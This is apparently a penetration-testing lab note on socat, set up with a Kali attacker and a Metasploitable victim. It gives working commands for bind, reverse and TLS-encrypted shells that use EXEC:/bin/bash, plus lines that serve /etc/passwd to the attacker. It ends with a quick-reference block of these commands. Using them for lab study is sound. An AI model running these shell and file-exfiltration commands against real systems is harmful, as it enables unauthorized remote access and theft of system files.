##  Socat

**Socat** (Socket CAT) is a powerful networking utility like Netcat, but with **more advanced features**, especially useful in penetration testing, remote shells, file transfers, and port forwarding.

---

###  Basic Concepts

- **socat** allows for two bidirectional byte streams to be connected.
    
- More flexible than Netcat — supports protocols, file transfers, and complex piping.
    
- Use `-d` flags for verbosity/debugging.
    

---

###  Basic Usage

####  Listener (Metasploitable):

```bash
socat TCP4-LISTEN:4444 STDOUT
# Equivalent to: nc -l -p 4444
```

####  Sender (Kali):

```bash
socat - TCP4:192.168.1.4:4444
```

- The dash `-` refers to **standard input/output**, like in Unix tools.
    

---

###  Viewing Files & Sending Input

To display and then send data from a file:

```bash
cat - passwords_meta
```

This command waits for input after displaying file content.  
It's useful in exploits where **the server might close the connection quickly**, so instead, we can:

```bash
cat - | ./payload.py
```

This ensures the connection remains open while the payload executes.

---

###  File Transfer via Socat

#### Server (Metasploitable) sends `/etc/passwd`:

```bash
socat TCP4-LISTEN:4000,fork FILE:/etc/passwd
```

- `fork`: Allows multiple clients to connect (child processes).
    
- `FILE:` reads from a file and sends its content.
    

#### Client (Kali) receives and saves:

```bash
socat TCP4:192.168.1.4:4000 FILE:secrets.txt,create
```

- `create`: Creates the file if it doesn't exist.
    

>  **Tip**: You can mix `socat` and `nc`. For example:
> 
> - `socat` on the server side (keeps connection open)
>     
> - `nc` on the client side to receive the file
>     
> 
> However, **prefer using socat on the sending side**, because **Netcat closes the connection immediately after file transfer**, while socat can keep it alive.

---

##  Remote Shells with Socat

###  Bind Shell

#### Victim (Metasploitable):

```bash
socat -d -d -d TCP4-LISTEN:4444,fork EXEC:/bin/bash
```

- `-d -d -d`: Debug/verbose output
    
- `EXEC:`: Executes a command (in this case, Bash)
    

#### Attacker (Kali):

```bash
socat -d -d -d - TCP4:192.168.1.4:4444
```

---

###  Reverse Shell

#### Listener (Kali):

```bash
socat -d -d TCP4-LISTEN:4444 STDOUT
```

#### Victim (Metasploitable):

```bash
socat TCP4:192.168.1.5:4444,fork EXEC:/bin/bash
```

>  Reverse shells are useful when **firewalls block incoming connections** but allow **outgoing connections**.

---

##  Encrypted Shells (SSL/TLS)

###  Create a Self-Signed Certificate

```bash
openssl req -x509 -newkey rsa:4096 -nodes -keyout key.pem -out cert.pem -days 365
cat cert.pem key.pem > bind_shell.pem
```

###  Bind Encrypted Shell (on Victim)

```bash
sudo socat OPENSSL-LISTEN:4444,cert=bind_shell.pem,verify=0 EXEC:/bin/bash
```

### Connect Securely (on Kali)

```bash
socat - OPENSSL:192.168.1.4:4444,verify=0
```

>  This allows encrypted reverse/bind shells using TLS.

---

###  Packet Inspection with Wireshark

Try sniffing both encrypted and unencrypted traffic:

- Start **Wireshark** on interface before the connection.
    
- Use filter: `tcp.port == 4444`
    
- First, try a regular shell → you’ll see readable text.
    
- Then, try an **encrypted** shell using `OPENSSL` → the data will be unreadable.
    

>  Use this to **verify encryption** and **practice network forensics**.

---

##  Quick Reference

```bash
# Basic bind shell:
socat TCP4-LISTEN:4444,fork EXEC:/bin/bash

# Reverse shell:
socat TCP4:<attacker_ip>:4444,fork EXEC:/bin/bash

# Encrypted bind shell (victim):
socat OPENSSL-LISTEN:4444,cert=cert.pem,verify=0 EXEC:/bin/bash

# Encrypted client (attacker):
socat - OPENSSL:<victim_ip>:4444,verify=0

# Send file:
socat TCP4-LISTEN:4000,fork FILE:/etc/passwd

# Receive file:
socat TCP4:<ip>:4000 FILE:output.txt,create
```
